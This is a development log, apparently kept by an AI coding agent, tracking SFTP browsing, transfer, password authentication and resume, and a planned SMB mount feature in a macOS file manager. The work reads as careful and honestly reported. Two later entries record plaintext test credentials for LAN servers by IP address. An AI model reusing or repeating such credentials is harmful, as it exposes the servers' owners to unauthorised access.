  `path.backend == .local` gates (local-only machinery; SFTP-destination is a later SFTP pass — not
  refactored speculatively). New app test `DirnexTests/CompositeBackendTests.swift` (+3 → **7 app
  tests**) asserts the crux: local path = full caps (`deleteStrategy == .trash`), archive + search
  paths = `.read` (`deleteStrategy == .unsupported`). Behavior on today's backends is **identical by
  construction** (traced each branch: local delete = Trash, archive/search delete greyed, New
  Folder/rename greyed on virtual) — the change is degradation *infrastructure* + a behavior-
  preserving refactor, so the visible payoff arrives with SFTP. `swift test` (390) + app
  `xcodebuild test` (7) green, swiftformat/swiftlint-strict clean, app launches + quits cleanly.
  **NEXT M5 (last item):** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 dependency + a live/
  dockerized SSH server to test against) — with per-path capabilities + `DeleteStrategy` now in
  place, an SFTP pane's grey-out and Trash-less delete-confirm work the moment the backend reports
  `[.read, .write, .rename]` (no `.trash`/`.clone`). Optional polish: Settings picker for the
  preferred diff tool.

Progress (2026-07-12, M5 pass 6): the **SFTPBackend read-only browse core** landed — the pure,
tested foundation of the last M5 item. Same sidestep M4 made for the libarchive gate: rather than
add a swift-nio-ssh/libssh2 dependency, the plan is to drive the **system `ssh`/`sftp` CLI** (ships
with macOS) behind an **injected transport**, so the whole backend is exercised with a fake and
needs *no live server* — the analogue of `ArchiveBackend`'s read-only first pass (browse first,
write/copy later). Box stays `[ ]` (no live transport, no writes, no app wiring, no server
verification yet); this is the browse half of "browse/copy through the standard queue". **Four new
DirnexCore files, purely additive (no existing-API changes, so the app is untouched and needs no
rebuild):**
- **`VFS/SFTPLocation.swift`** — the connection descriptor (`host`+`port`(=22)+`username`, `Codable`,
  **no secret** — the password/key passphrase is a Keychain reference the app resolves, so a location
  is safe to serialize into a tab/bookmark/id). Encodes to a `VFSBackendID` as `sftp://user@host:port`
  (the SFTP analogue of the on-disk path an archive id carries), with `init?(descriptor:)` /
  `init?(backendID:)` and `VFSBackendID.sftp(_:)`/`.sftpLocation`/`.isSFTP` extensions — kept in this
  file (not `VFSPath.swift`) so the addition is purely new-files. Username split at the **first** `@`,
  port at the **last** `:` (bracketed IPv6 literal noted as a later refinement, not a hole).
- **`VFS/SFTPTransport.swift`** — the injected boundary: `SFTPTransport` protocol (`listDirectory(_:)`
  → raw `ls -la` text, `statItem(_:)` → raw `ls -ld` line) + `SFTPTransportError{notFound /
  permissionDenied / failure(String)}` (the few shapes the backend maps onto `VFSError`). Synchronous
  (the backend is always called off-main); the app supplies a `Process`-driven impl, tests a fake.
- **`VFS/SFTPListingParser.swift`** — a **close cousin of `ArchiveTOCParser`** (same "8 fixed columns
  then a verbatim name" shape, same `nameField` column-skip so internal spaces survive, same
  `en_US_POSIX` `MMM d HH:mm`/`MMM d yyyy` date formats) but **flat** (one directory, no tree, no
  ancestor synthesis) — kept separate to avoid churning the heavily-tested archive parser. `ls -la` →
  `[Entry]` (name/kind/byteSize/mtime/**permissions**/symlinkDestination): drops the `total` header
  and the `.`/`..` rows, mode-char → kind (`d`/`l`/`-`/other), ` -> target` split for symlinks, mode
  string → POSIX bits, tolerates an ACL `+`/xattr `@` 11-char mode. `parseItem` reads the single
  `ls -ld` line.
- **`VFS/SFTPBackend.swift`** — the `VFSBackend` over the injected transport (a `struct`, like
  `ArchiveBackend`). `id == .sftp(location)`; **`capabilities == .read`** for now (advertising `.write`
  before copy-in works end-to-end would let the UI start a paste the backend can't finish — the honest
  cap today; the widened `[.read, .write, .rename]` that lights up pass-5's `DeleteStrategy`/clone
  degradation arrives with the byte-transfer pass). `listDirectory`/`stat` route through the parser;
  `stat` **names the entry from the queried path's last component** (since `ls -ld /a/b` prints the
  full arg as the name); a `mapErrors` helper attaches the `VFSPath` the transport (raw-string only)
  couldn't, turning `SFTPTransportError` → `VFSError.notFound/permissionDenied/io`. `volumeIdentifier`
  = `sftp://host:port` so **all one-host jobs serialize** (one SSH channel — parallel transfers only
  contend), cheap/no-I/O as the protocol requires. symlink target reported as nominal `.file` (not
  resolved — matches `ArchiveBackend`); no birth time → `creationDate = modificationDate`.
+8 `SFTPLocation` +11 `SFTPListingParser` +9 `SFTPBackend` tests (a private `FakeSFTPTransport` double
returning canned listings / throwing configured errors) → **418 core tests** (was 390). `swift test`
green, swiftformat/swiftlint-strict clean. GOTCHA: a year-stamped `ls` date parses at **local**
midnight (the formatter sets no zone) → the test must read `.day` in the local calendar, not forced
UTC, or the day shifts. **NEXT M5 (finishes the item):** the app-layer live transport — a
`Process`-driven `ssh`/`sftp` runner (mirroring `ArchiveMounter`/`SpotlightSearchRunner`), a
connection manager + Keychain credential storage + key auth, composite-backend routing on `isSFTP`,
and the **write pass** (mkdir/move/remove + byte `copyFile` with resume, flipping caps to
`[.read, .write, .rename]` → the pass-5 grey-out + Trash-less permanent-delete confirm go live). That
tail is the genuine infra gate: it needs a live/dockerized SSH server (or local Remote Login) +
credentials to verify against — which I can't provision here, so it awaits that setup. Optional
polish still open: Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 7): the **live SFTP transport + app wiring + Connect-to-Server UI** —
**SFTP browse now works end-to-end and is VERIFIED LIVE** against a real server (`oleg@mac`, local
Remote Login), so the `SFTPBackend` box goes `[ ]`→`[~]` (browse done; byte transfer + password/
Keychain auth remain). The user enabled `ssh oleg@mac`; key auth was set up (a throwaway ed25519 key
authorized for the session, all test artifacts cleaned up after). CRITICAL: driving the real `sftp`
CLI first showed its batch `ls -la` **differs from GNU `ls -l`** (captured live), so **pass 6's core
was reworked to match reality** (pass 6 was still uncommitted): (1) the link-count column is `?`;
(2) names are printed as **full paths** (`ls -la <abs>` echoes the arg) → every name reduced to its
last component; (3) symlink **targets aren't shown** (no ` -> t`); (4) `sftp` has **no `ls -d`** → a
single-item stat can't use it. Core changes (still purely additive to DirnexCore): `SFTPTransport`
slimmed to one method `listDirectory` + a tested `SFTPTransportError.classify(stderr:)` (maps `sftp`
stderr → notFound/permissionDenied/failure; permission-denied checked **first** so a bad-key
`identity file … no such file` + `Permission denied` classifies as the actionable auth failure) +
`SFTPBatchCommand.list` (quoted/escaped batch line, tested); `SFTPListingParser` now `parse`s **all**
rows basenamed **including `.`/`..`**; `SFTPBackend.stat` uses the **`.` self-row trick** (a dir
listing carries a `.` row that *is* the directory's stat → identify it, else it's a single-file
row). App layer: `SFTPProcessTransport` (spawns `sftp -i key -o BatchMode=yes -b -`, drains stderr on
a bg queue to dodge a two-pipe deadlock, `resolveHomeDirectory` via `pwd`); `CompositeBackend`
gained an `sftpConnections` registry + `connectSFTP` + `isSFTP` routing (`connectedSFTP` throws a
clear "Not connected" otherwise); `go.connectServer` command → `PanelViewController+SFTP.connectToServer`
(probes home off-main = a fail-fast connection test, then registers + navigates) + `SFTPConnectPrompt`
(NSAlert grid: host/port/user/key-file, rejects leading-`-` args). Two LIVE-found bugs fixed: (a) the
path bar rendered SFTP as **"🔍 Results for oleg"** (the search-results dead-end label) → added an
`isSFTP` branch giving **clickable breadcrumbs rooted at the account** (`oleg@mac › Users › oleg`),
since an SFTP path is re-listable; also `PanelViewController.navigate` no longer treats SFTP as
"wasVirtual" (it keeps a normal back/forward trail) and `FrecencyStore.recordVisit` now only records
`.local` paths (a remote path can't be fuzzy-jumped). (b) recent `ls` dates showed **year 2000** —
the "MMM d HH:mm" form omits the year and `DateFormatter` defaults it to a 2000 reference → set
`defaultDate = now` on the no-year formats (+ a future-date year rollback for the Dec/Jan boundary).
Tests: +`SFTPTransport`(batch/classify incl. bad-key ordering) +`connectServer` catalog cmd +current-
year date +CompositeBackend sftp routing/read-only + a **gated live integration suite**
(`DirnexTests/SFTPLiveIntegrationTests`, enabled only when `/tmp/dirnex_sftp_live_test.json` exists —
`xcodebuild` doesn't forward shell env, so a file not env vars) → **427 core tests**, **14 app tests**
(4 live: resolve-home, list, stat, composite-route — proven genuinely live by a bogus-key run that
*fails* them, not skips). GOTCHA (recurring): the connectServer command tipped `CommandCatalog` over
`type_body_length` 250 → moved the whole `navigation` array into the bottom extension. VERIFIED LIVE
end-to-end via the GUI: Go ▸ Connect to Server → filled host/user/key → the left pane browsed the
remote home (21 items, `oleg@mac › Users › oleg` breadcrumb, correct 2026 dates), then **double-clicked
into `dirnex_sftp_fixture`** — breadcrumb extended, listed `emptydir`/`photos`/`latest` (symlink)/`my
report.txt` (space preserved)/`notes.txt`, `.`/`..` dropped. App `xcodebuild` + `swift test` green,
swiftformat/swiftlint-strict clean. SPOTTED FOLLOW-UP (out of scope, pre-existing): `ArchiveTOCParser`
shares the same no-year→2000 date bug for recent archive members — worth the same `defaultDate = now`
fix. **NEXT M5 (finishes `SFTPBackend`):** the write pass — `SFTPProcessTransport` gains
mkdir/rename/remove + `copyFile` (download via `sftp get`, upload via `put`) with progress/resume,
flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 grey-out + Trash-less permanent-delete
confirm light up; then password/Keychain auth (needs a PTY). Optional polish: an SSH ControlMaster so
repeated listings reuse one connection instead of re-handshaking per directory; saved connections in
the sidebar; Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 8): the **SFTP write pass** — remote mutation + byte transfer, so the
operation queue drives copies, moves, and deletes onto a remote exactly as on disk. **`SFTPBackend`
box stays `[~]`** (byte transfer now DONE; only keychain **password auth** + mid-file **resume**
remain). **VERIFIED LIVE** against `oleg@mac` (a throwaway key the user authorized for the session,
all artifacts cleaned up after — including the remote scratch dir, which the recursive-delete proved
it removes): the gated live suite's new **write round-trip** (mkdir → `put` upload → list-and-check-
size → `get` download → byte-compare → recursive remove) passed through the real `sftp` CLI, plus the
5 existing browse tests. Core→app as always:
- **Core** (hermetic, +14 tests → **441**): `SFTPTransport` grew the write verbs (`makeDirectory`/
  `rename`/`removeFile`/`removeDirectory`/`createSymbolicLink`/`download`/`upload`) + matching
  quoted/escaped `SFTPBatchCommand` builders (`mkdir`/`rename`/`rm`/`rmdir`/`ln -s`/`get`/`put`).
  `SFTPBackend.capabilities` flipped **`.read` → `[.read, .write, .rename]`** (no `.trash`, no
  `.clone` — the exact shape pass 5's `DeleteStrategy`/clone degradation was built for). New
  primitives: `createDirectory` (mkdir); `moveItem` = remote rename within one account, else
  **throws `EXDEV`** so `CopyEngine` falls back to copy-then-delete for a cross-backend (local⇄SFTP)
  move; **recursive `removeItem`** — `sftp` has no `rm -r`, so it empties a directory depth-first
  then `rmdir`s it, and crucially classifies the top item from its **parent listing**, not a `stat`
  of the path (`sftp`'s `ls` *follows* a symlink, so statting a link-to-dir would delete the
  *target's* contents — a parent listing shows the link as a link, so `rm` removes the link alone);
  `copyFile` = **download** (`id` source → `.local` dest, `get`) or **upload** (`.local` source →
  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honouring
  `isCancelled` at the file boundary, refusing an unexpressible remote↔remote copy. The fake
  transport now records every write call so the recursion/routing is asserted without a server.
- **App**: `SFTPProcessTransport` spawns each verb as one `sftp` batch command (reusing the pass-7
  `run(batch:)`), transfers returning the local file's size for progress. `CompositeBackend` routes
  `capabilities(for:)` to a **connected** SFTP backend (`[.read, .write, .rename]`; an unconnected /
  dropped SFTP path falls back to `.read` so writes grey out rather than fail), routes `copyFile` on
  the **destination** when it is remote (so an upload reaches the SFTP `put`; a download/local-local
  still routes on the source), and throws `EXDEV` for any cross-backend move. Reconciled
  `isVirtualDirectory` → **`isArchive || isSearchResults`** (an SFTP dir is a *real* writable remote
  directory, not virtual), which — together with pass-5's capability-driven `validateMenuItem` —
  lights up New Folder (mkdir), F2/⇧F2 rename (remote rename), F8 delete (Trash-less → confirmed
  permanent), ⌘V paste-upload, and F5/F6 up/down on an SFTP pane; relaxed `beginTransfer`'s
  destination guard to allow an SFTP target (upload), made `refreshCurrentDirectory` re-list an SFTP
  pane after a mutation (no FSEvents), and gated ⌘C off SFTP (a remote entry has no *local* URL for
  the pasteboard — F5 is the copy-out route). +1 app test → **16** (`CompositeBackendTests` now
  asserts a connected SFTP path is writable/`.permanent`, an unconnected one read-only). GOTCHA
  (recurring): the new write tests tipped `SFTPBackendTests` over swiftlint `type_body_length` 250 →
  split them into a same-file `extension SFTPBackendTests`. `swift test` (441) + app `xcodebuild
  test` (16) green, swiftformat/swiftlint-strict clean. **NEXT M5 (finishes `SFTPBackend` → `[x]`):**
  password/Keychain auth (needs a PTY, so not the batch `sftp -b -` path — likely `expect`-style or
  an `SSH_ASKPASS` helper) and mid-file resume (`get -a`/`put -a`). Optional polish: SSH
  ControlMaster connection reuse, saved connections in the sidebar, Settings picker for the diff
  tool. **M6 is the next milestone** once SFTP closes out.

Progress (2026-07-13, M5 pass 9): **SFTP password auth** — the harder of the two remaining
`SFTPBackend` items, **DONE and verified live** against a real password server (user-provided
`sa@192.168.1.176`, pass `123`). The plan predicted this "needs a PTY"; it doesn't — the sidestep is
`SSH_ASKPASS`. Key facts discovered by probing OpenSSH 10.2 live before writing any Swift, all of
which shaped the design: (1) `sftp -b -` forces `-oBatchMode=yes` onto `ssh`, which **disables the
password prompt entirely** ("no more authentication methods"), so password auth **cannot use `-b`** —
it runs `sftp` *interactively* over a piped stdin, and the parser's pre-existing `sftp>`-echo skipping
(pass 6/7) already handles the interactive output. (2) With no TTY, `SSH_ASKPASS_REQUIRE=force`
(OpenSSH ≥ 8.4) makes `ssh` call the `SSH_ASKPASS` program for the password — **proven live via a
marker-file probe** that the helper actually fires. (3) **`keyboard-interactive` HANGS for ~60 s on a
*wrong* password** when askpass auto-answers it (macOS PAM), which would freeze the pane on a typo —
so only the `password` method is offered (`PreferredAuthentications=password`, plus
`PubkeyAuthentication=no` so a stray local key can't bypass the choice, `NumberOfPasswordPrompts=1` to
fail fast). Core→app as always:
- **Core** (pure, tested, +6 → **446**): `SFTPAuthentication` enum (`.key(identityFile:)` / `.password`,
  **no secret** — the password is resolved by the app and fed out-of-band); `SFTPProcessArguments.batch(
  location:authentication:connectTimeout:)` assembles the argv — **key** = the untouched verified
  `-i … -o BatchMode=yes … -b -`, **password** = interactive (no `-b`) + the password-only flags above
  — pinned by tests so the security-sensitive flag set (which auth methods, prompt on/off) is verified
  without a server, like `SFTPBatchCommand`; `SFTPTransportError.detect(stderr:)` — interactive `sftp`
  **exits zero on a failed command**, so its errors live only in stderr, and this scans for them
  (`permission denied`/`not found`/`Couldn't …`/`: Failure`) while ignoring benign banners/`Connected
  to …`/host-key warnings; `SFTPLocation.keychainService` + `keychainAccount` (`user@host:port`).
- **App**: `SFTPProcessTransport` reworked to `authentication` + `password` (was `identityFile`), builds
  argv from the core builder, and for password sets the child env (`SSH_ASKPASS` → helper,
  `SSH_ASKPASS_REQUIRE=force`, the password in `DIRNEX_SFTP_PASSWORD`) — the password rides **only** in
  the process environment, never on the argv or on disk. `SFTPAskpassHelper` writes a **secret-free**
  `#!/bin/sh; printf '%s\n' "$DIRNEX_SFTP_PASSWORD"` once to Application Support (0700). `run` now
  drains **both** pipes on a concurrent queue joined by a `DispatchGroup` so a password session can
  **bound its wait** (`passwordTimeout`, 30 s) — a server that never closes the channel can't hang the
  pane — and throws on a bad interactive command via `detect`. `resolveHomeDirectory` opts into
  `tolerateChannelHold` (the connect probe's single-line `pwd` reply is complete even if the server
  holds the channel open — the live test server does exactly that, so a real connect there takes the
  full timeout but succeeds). `SFTPKeychain` (Security framework) stores/loads/deletes the password
  keyed by `keychainAccount`; `SFTPConnectPrompt` gained a Private-Key/Password segmented control + an
  `NSSecureTextField` (irrelevant field greys out); `connectToServer` stores the password to the
  Keychain **only after** the probe authenticates (so a typo isn't cached); `CompositeBackend.connectSFTP`
  + the live/app-test call sites thread `authentication`/`password`. +1 app test (askpass helper is
  executable) + a self-gated **localhost wrong-password** live test (real transport → `.permissionDenied`
  in ~2.4 s, **no TTY hang** — the crux) + a credential-gated **live password-auth** suite
  (`/tmp/dirnex_sftp_password_test.json`) → **19 app tests**. VERIFIED LIVE end-to-end: the real
  `SFTPProcessTransport` authenticated against the user's server with `sa`/`123` through the actual
  `sftp`+`SSH_ASKPASS` path and resolved the remote home. `swift test` (446) + app `xcodebuild test`
  (19) green, swiftformat/swiftlint-strict clean. GOTCHA: the test server ("ServeSense … Brute Force
  Protection") returns an **empty root and holds the channel open** (hangs even after `quit`) — proved
  auth but not browse; `tolerateChannelHold` + `passwordTimeout` keep it from hanging the pane. Also:
  `NSSecureTextField` + a 6-field form tripped swiftlint `function_parameter_count` → grouped the
  controls into a `Fields` struct. **NEXT (finishes `SFTPBackend` → `[x]`):** mid-file **resume**
  (`get -a`/`put -a`) — optional polish, not in the M5 exit criteria; then **M6**.

Progress (2026-07-14, M5 pass 10): **mid-file resume** (`get -a`/`put -a`) — the last remaining
`SFTPBackend` item, **now `[x]`, so the whole SFTP box closes and M5 is DONE**. A copy that finds a
nonzero *proper prefix* of the source already at the destination (a partial from an interrupted
transfer) picks up where it left off instead of re-sending the whole file; `sftp` computes the byte
offset itself from the existing length. User supplied a new test appliance at **192.168.1.50** (SFTP
:22, FTP :21, FTPS :990; `sa`/`123`) — a **ServeSense "Brute Force Protection"** box, the same kind
as pass 9's password server. Chose "finish SFTP first" over adding FTP/FTPS (not in the plan). Core→
app as always:
- **Core** (pure, tested, +5 → **451**): `SFTPTransport.download`/`upload` grew a `resume: Bool`
  parameter; `SFTPBatchCommand.download`/`upload` emit `get -a`/`put -a` when set (default `false`
  keeps every existing call site). `SFTPBackend.copyFile` reworked into `downloadFile`/`uploadFile`
  helpers that **detect a resumable partial cheaply so the common fresh transfer pays nothing**: a
  **download** reads the local partial's size (free `FileManager` stat) and only then asks the server
  for the remote size — a fresh download (no local partial) skips the remote round trip entirely; an
  **upload** only asks the server for the remote destination's size when the source exceeds
  `resumeUploadThreshold` (1 MiB), since re-sending a small file costs less than the metadata round
  trip that finding its partial would need. `progress` reports only the bytes actually moved (the
  remainder when resuming), computed as `finalSize − preExistingSize`; the transport's return value
  was redefined from "bytes transferred" to "the file's final total size" so the backend can derive
  the delta. Tests: batch-command `-a` variants; `copyFile` resumes a download (local partial 120 <
  remote 300 → `get -a`, reports 180), resumes a large upload (remote partial 1 MiB < 2 MiB source →
  `put -a`, reports the 1 MiB remainder), **does not** resume a small upload (skips the stat), and
  **does not** resume a fresh download. GOTCHA (recurring): the fake transport's recorded-transfer
  tuple went to 3 members (`local`/`remote`/`resume`) → swiftlint `large_tuple` → extracted a
  `RecordedTransfer` struct.
- **App**: `SFTPProcessTransport.download`/`upload` thread `resume` through to the batch builder
  (returning the local file's final size). +1 gated live test (`resumesPartialTransfer` in
  `SFTPLiveIntegrationTests`): upload a 120-byte prefix, `put -a` the full 300, then `get -a` a local
  120-byte partial back to 300 and byte-compare — runs green on a well-behaved key-auth server (skips
  in CI / here, like the other live tests). App tests stay at **20** (the new one is gated).
- **Live verification**: the resume *mechanic* was proven end-to-end against the user's 192.168.1.50
  server via the actual `sftp` CLI the app shells out to — `put -a` grew a seeded 120-byte remote file
  to 300 ("Resuming upload", byte-compare matched), and `get -a` grew a local 120-byte partial to 300
  (byte-compare matched); mkdir/put/get/rm/rmdir were also all exercised and the remote left clean.
- **Known limitation (the ServeSense appliance, documented not fixed):** 192.168.1.50 **authenticates**
  (`sa`/`123`, verified live via the app's connect probe, which opts into `tolerateChannelHold`) but
  **holds the SSH channel open after every command** (hangs even after `quit`), so the app's
  one-shot-per-command transport **times out on browse/transfer** through it (only the single-line
  connect probe tolerates the hold today — a multi-row listing must not be read partially). This is
  the same appliance quirk pass 9 already noted; making the whole app work against channel-hold
  appliances (tolerating the hold for transfers, whose size comes from the local file rather than
  stdout) is a separate, considered enhancement, deliberately **not** bundled into this resume pass.
  Because of it, resume was verified via raw `sftp` (above), not the app transport, against this
  particular box; the app-transport path is covered by the gated live test on a normal server.
- **Scope honesty:** resume is a correct, tested `copyFile` capability that activates whenever a
  partial destination is handed in. The current in-app copy flow writes to **fresh temp destinations**
  (the M2 overwrite path uses a per-attempt UUID temp; the direct `.proceed` path writes a fresh
  target), so nothing hands `copyFile` a partial today — resume is inert in that flow by construction.
  Wiring it to fire in-app means preserving a partial across a conflict/overwrite retry (a stable temp
  name), which touches the M2 atomic-swap/undo guarantees — left as a deliberate future step, not done
  here. `swift test` (451) + app `xcodebuild test` (20) green, swiftformat/swiftlint-strict clean.
  **M5 network+sync is now fully `[x]`; M6 (Mac-native power features) is next.** Optional polish
  still open across M5: SSH ControlMaster connection reuse (would also make the resume upload-stat and
  browse cheap, and could sidestep the ServeSense per-command hang), saved SFTP connections in the
  sidebar, a Settings picker for the preferred diff tool; and the user's FTP/FTPS servers remain
  available if FTP(S) backends are ever added (a plan expansion beyond M5's SFTP-only scope).

Progress (2026-07-14, M5 — SMB + unified connection manager, SCOPED not yet built): with the four
original M5 boxes `[x]`, the milestone gains one more remote protocol (SMB, for LAN Macs / PCs / NAS)
plus the "keep every connection in one place" manager the SFTP work deferred. Two design decisions,
both taken deliberately over the tidier-looking alternative:
- **SMB rides the OS mounter, not a protocol backend.** SFTP could shell out to the system `sftp`
  CLI; macOS ships **no `smbclient`**, so the equivalent OS-native sidestep for SMB is the *mounter*.
  `NetFSMountURLSync` (or `Process` → `/sbin/mount_smbfs`) mounts `smb://user@host/share`, and the
  existing `LocalBackend` browses the `/Volumes/…` tree it produces — so copy/move/rename/delete
  (M2), synchronize-directories, compare-by-content, quick-view, and even browsing a zip *on* the
  share all work with **zero new code** and **no new `CompositeBackend` routing**. The rejected
  alternative was a real `SMBBackend` over libsmb2/AMSMB2: it keeps the clean "just another
  VFSBackend" symmetry SFTP has (`smb://…` routed like `sftp://…`, no `/Volumes`), but it's the heavy
  C dependency the plan avoided for SFTP — a module gate like the deferred libarchive one — with no
  CLI to sidestep it and every M2/sync/compare guarantee to re-prove over it. Consistent with the
  non-goals ("folders work as folders; no proprietary APIs"), the mount wins. The one genuinely new
  surface is a **mount lifecycle**: an app-layer `SMBMounter` + mount registry (the non-hermetic I/O
  boundary, like `ArchiveMounter`), mounting on connect, unmounting only what *we* mounted on
  disconnect/quit (leaving a Finder-mounted share alone), and detecting an already-mounted share. Caps
  = `[.read, .write, .rename]`, no APFS clone, Trash-varies → **reuse the pass-5 capability-degradation
  + Trash-less permanent-delete path verbatim**. Guest/anonymous mounts (blank user) supported for
  home NAS; `smbutil view //user@host` share-discovery and Bonjour `_smb._tcp` LAN auto-discovery are
  optional niceties (the latter M6-ish).
- **One connection manager for both protocols.** Today live SFTP connections are ephemeral in
  `CompositeBackend.sftpConnections` (lost on quit) and nothing persists a saved server. Rather than
  add a second, SMB-only model, unify: a pure `ServerConnection` (name = identity like `SavedSearch`;
  `kind: .sftp / .smb`; coordinates + auth *method*, never the secret — Keychain still holds those) +
  `ServerConnections` list (the `SavedSearches` save/rename/move/dedupe shape, unit-tested headless);
  an app `ServerConnectionStore` (UserDefaults JSON + `didChangeNotification`, a `SavedSearchStore`
  clone); a **Servers** sidebar section mirroring **Searches** (click → connect/mount + navigate;
  right-click → Connect / Edit… / Remove; live connected/mounted indicator); and a generalized prompt
  (rename `SFTPConnectPrompt` → `ConnectServerPrompt`, `PanelViewController+SFTP` → `+Connect`) with a
  protocol segmented control (SFTP | SMB) above the existing Auth control and a "Save connection" name
  field. **Address entry is Finder-⌘K-style**: a primary `smb://user@host/share` URL field (type or
  paste, exactly the form Finder's Connect to Server takes) that **parses into editable host / share /
  user fields shown below it**, so paste-a-URL and guided entry both work and the two stay in sync;
  a bare `smb://host` (share omitted) mounts-on-connect / offers a share picker. Under the hood this is
  the same NetFS mount as above — the URL is just what the user sees and what the sidebar stores. This
  **subsumes** the deferred "saved SFTP connections in the sidebar" polish item. The app
  stays non-sandboxed (a plan non-goal), so `mount_smbfs` / NetFS needs no special entitlement.
Nothing built yet — this is the scoped design; core-first as always (`ServerConnection(s)` + tests,
then `SMBMounter` / store / sidebar / prompt), verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 1 — the pure core): the tested, headless value types landed, the
same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioural change to any
existing type (one additive conformance):
- **`VFS/SMBLocation.swift`** — the SMB analogue of `SFTPLocation`: `host` / `share?` / `username?` /
  `port` (default 445), *without* a secret. Deliberately **not** a `VFSBackendID` address — SMB rides
  the OS mounter, so this is purely the Finder-⌘K URL the user types/pastes and the sidebar stores
  plus the mount target it resolves to. `url` renders the canonical `smb://[user@]host[:port][/share]`
  (default port elided, guest omits `user@`, share-less stops at the host); `init?(url:)` parses that
  form back into editable coordinates — the "address field parses into host/share/user fields below"
  the design calls for is just this round-trip. Parse rules: username up to the first `@`, host up to
  the first `/`, a `:digits` tail split off as the port (a non-numeric colon stays in the host), the
  **first** path component as the share (deeper `…/share/sub` mounts the share; the subpath is
  navigated post-mount). Empty share/username normalize to `nil` so guest and share-less each have one
  representation. `keychainService = "com.dirnex.smb"` + `keychainAccount` = the scheme-less URL
  (unused for guest). Domain (`DOMAIN;user`) and bracketed IPv6 are noted later refinements, like
  SFTP's IPv6 note.
- **`Services/ServerConnection.swift`** — the unified saved-server model (mirrors `SavedSearch`
  name-as-identity): `ServerConnection`(name + `ServerEndpoint`) where `ServerEndpoint` is
  `.sftp(location:authentication:)` | `.smb(SMBLocation)` — one list covers both protocols rather than
  a second SMB-only model. Convenience `kind: ServerKind{.sftp,.smb}` (sidebar icon/branch) and
  `address` (the SFTP descriptor / SMB URL for the subtitle). No secret in the endpoint: SFTP carries
  its auth *method* (`.key(identityFile:)` path or the `.password` marker), SMB's guest-vs-auth is
  captured by whether `username` is set — Keychain still holds any actual password. `ServerConnections`
  is the `SavedSearches` collection verbatim (`save` replace-in-place/append, `remove`,
  `rename` with collision guard, `move`, dedupe-on-init, sanitizing `Codable`). Needed one additive
  change: **`SFTPAuthentication` gained `Hashable, Codable`** (it was `Equatable`) so the endpoint
  enum synthesizes both — purely additive, the full app still builds.
- **`SMBLocationTests` (13) + `ServerConnectionTests` (17)** → **481 core tests** (was 451; +30),
  covering URL format/parse/round-trip/malformed for SMB and the full collection contract +
  per-protocol Codable for the connection list. `swift test` green, swiftformat + swiftlint-strict
  clean, `xcodebuild` app build succeeds. **NEXT (SMB pass 2, app layer):** `SMBMounter` + mount
  registry (NetFS `NetFSMountURLSync` / `mount_smbfs`; mount on connect, unmount only our own),
  `ServerConnectionStore` (a `SavedSearchStore` clone), the **Servers** sidebar section (mirrors
  **Searches**), and the generalized `ConnectServerPrompt` (rename `SFTPConnectPrompt`; protocol picker
  SFTP | SMB + Save + the URL-expands-to-fields entry) — verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 2 — the app layer, CODE-COMPLETE; live-mount check pending): all
four pass-2 surfaces built, app builds + `swift test` (481 core) + 24 app tests green, swiftformat +
swiftlint-strict clean. Nothing touched `CompositeBackend` routing — SMB never becomes a `VFSBackendID`;
it rides the OS mounter and browses `/Volumes/…` as `.local`, exactly as designed.
- **`SMBMounter.swift`** — the mount lifecycle (the one non-hermetic surface, like `ArchiveMounter`).
  `@MainActor final class` with a `shared` app-wide registry of the `/Volumes/…` paths *we* created.
  `mount(_:username:password:) async` snapshots `FileManager.mountedVolumeURLs` before mounting, runs
  the blocking `NetFSMountURLSync` on a `Task.detached` (so the four static helpers are
  `nonisolated static`), and records the mount as ours only if the path wasn't already mounted — so a
  Finder-mounted share is never adopted. Guest mount = `kNetFSUseGuestKey` + nil user (blank username);
  auth mount passes user/pass separately. **The mount URL is built user-less** (`smb://host[:port]/share`,
  default 445 elided) — the username goes to NetFS as a separate arg, never in both (the one unit-tested
  invariant). `kNAUIOptionKey = kNAUIOptionNoUI` so a bad password errors instead of blocking on a
  dialog. `disconnect(mountPoint:)`/`unmountOwnedMounts()` (called from `AppDelegate.applicationWill
  Terminate`) eject only our mounts via `NSWorkspace.unmountAndEjectDevice`. `SMBMountError:
  LocalizedError` maps `EAUTH`/`ENOENT`/`EHOSTDOWN`/… to human reasons. Needed `import NetFS` (auto-links;
  typechecked green against the SDK). `SMBKeychain` = an `SFTPKeychain` clone keyed by
  `SMBLocation.keychainService`.
- **`ServerConnectionStore.swift`** — a `SavedSearchStore` clone verbatim (UserDefaults JSON under
  `Dirnex.serverConnections` + `didChangeNotification`); no secret ever serialized.
- **Servers sidebar section** — mirrors Searches. `SidebarViewController.Row` gained `.server`, a
  **Servers** header trails the Volumes section, per-kind SF Symbol (`network` SFTP /
  `externaldrive.connected.to.line.below` SMB), click → `didActivateServer`, trailing delete +
  right-click **Connect / Edit… / Remove** (Remove also clears the Keychain secret). Split the
  saved-search **and** new server management into companion files (`SidebarViewController+Searches.swift`,
  `+Servers.swift`) to stay under file_length 500 — which forced widening `Row`/`tableView`/`rows` to
  internal (Swift `private` doesn't cross files, the recurring gotcha); `menuNeedsUpdate` stays in the
  main file as a dispatcher. Two new delegate methods (`didActivateServer`/`didEditServer`).
- **`ConnectServerPrompt` + `ConnectServerForm`** (renamed from `SFTPConnectPrompt`;
  `PanelViewController+SFTP`→`+Connect`, both via `git mv` — synchronized Xcode groups need no pbxproj
  edit). Prompt returns a `Form(endpoint: ServerEndpoint, password:, saveName:)` reusing the pass-1 core
  enum. The form is a protocol picker (SFTP | SMB) over **independent** per-protocol field sets (so no
  cross-contamination / no SFTP `NSUserName()` default leaking into SMB); accessory sized once to the
  taller (SFTP) layout so toggling rows never resizes the modal. **SMB entry is Finder-⌘K-style**: an
  `smb://user@host/share` address field two-way-synced with editable host/share/user fields via the pure
  `SMBLocation` url⇄init round-trip (`controlTextDidChange`, re-entrancy-guarded; port rides the URL).
  Prefill (Edit…) loads coordinates + the Keychain secret. `type_body_length` >250 → view/value factories
  moved to a file-scope `@MainActor private enum ConnectFormFactory`. `PanelViewController+Connect`:
  `connectToServer` (prompt→apply), `connect(to:)` (saved-server, Keychain secret or fall back to the
